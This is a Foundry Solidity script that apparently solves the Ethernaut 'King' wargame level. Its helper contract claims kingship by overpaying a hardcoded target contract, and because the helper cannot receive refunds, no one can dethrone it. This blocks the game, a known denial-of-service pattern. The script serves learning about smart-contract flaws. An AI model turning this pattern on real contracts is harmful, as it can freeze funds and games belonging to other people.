//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";
import {King} from "../../src/ethernaut/king.sol";

contract breakKing is Script {
    function run() public {
        vm.startBroadcast();
        // fund the hack contract with the amount nedded
        hackKing hack = new hackKing();
        hack.attack{value: hack.getPrize() + 1 wei}();
        vm.stopBroadcast();
    }
}

contract hackKing {
    King king = King(payable(0xCC4B55f4E475aA48091d1892eC5e3Ad6050ec836));

    function attack() public payable {
        // send to the contract more then a prize:
        (bool ok, ) = address(king).call{value: address(this).balance}("");
        require(ok, "tx failed");
    }

    function getPrize() public view returns (uint) {
        return king.prize();
    }
}
